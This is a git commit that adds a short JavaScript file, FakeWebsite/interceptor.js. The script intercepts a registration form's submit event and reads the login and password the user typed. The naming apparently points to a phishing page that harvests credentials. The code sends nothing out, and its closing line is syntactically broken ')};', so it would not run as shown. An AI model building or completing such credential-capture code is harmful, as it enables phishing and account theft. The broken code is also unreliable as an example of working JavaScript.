0720fe9a41378e369afb4ffd93c710ff6a651006
DeltaOpenSource <datadccenter@gmail.com>
2025-12-15 04:41:14 +0900

    Create interceptor.js

---
+++ FakeWebsite/interceptor.js
@@ -0,0 +1,6 @@
+document.getElementById('registerForm').addEventListener('submit', function(event) {
+    event.preventDefault();
+
+    const login = document.getElementById('login').value;
+    const password = document.getElementById('password').value;
+)};
